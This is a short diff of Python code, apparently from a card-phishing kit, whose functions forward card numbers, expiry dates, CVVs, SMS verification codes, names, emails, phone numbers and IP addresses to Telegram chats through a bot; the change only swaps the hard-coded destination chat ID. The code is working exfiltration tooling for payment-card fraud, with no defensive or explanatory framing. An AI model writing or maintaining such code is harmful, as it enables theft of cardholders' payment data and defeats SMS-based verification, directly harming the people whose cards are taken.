@@ -31,11 +31,11 @@ def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
 def send_me1(card, date, cvv):
     bot = Bot(token=api)
     text = escape_reserved_characters(f'🃏  `{card}`\n⏰  `{date}`\n🗄 `{cvv}`')
-    bot.send_message(chat_id='-4283929645', text=text, parse_mode='MarkdownV2')
+    bot.send_message(chat_id='-4231677984', text=text, parse_mode='MarkdownV2')
 def send_sms1(card, sms):
     bot = Bot(token=api)
     text = escape_reserved_characters(f'🃏  `{card}`\n💬 `{sms}`')
-    bot.send_message(chat_id='-4283929645', text=text, parse_mode='MarkdownV2')
+    bot.send_message(chat_id='-4231677984', text=text, parse_mode='MarkdownV2')
 
 def send_me(CHAT_ID, card, date, cvv, ID, ip):
     bot = Bot(token=API_TOKEN)
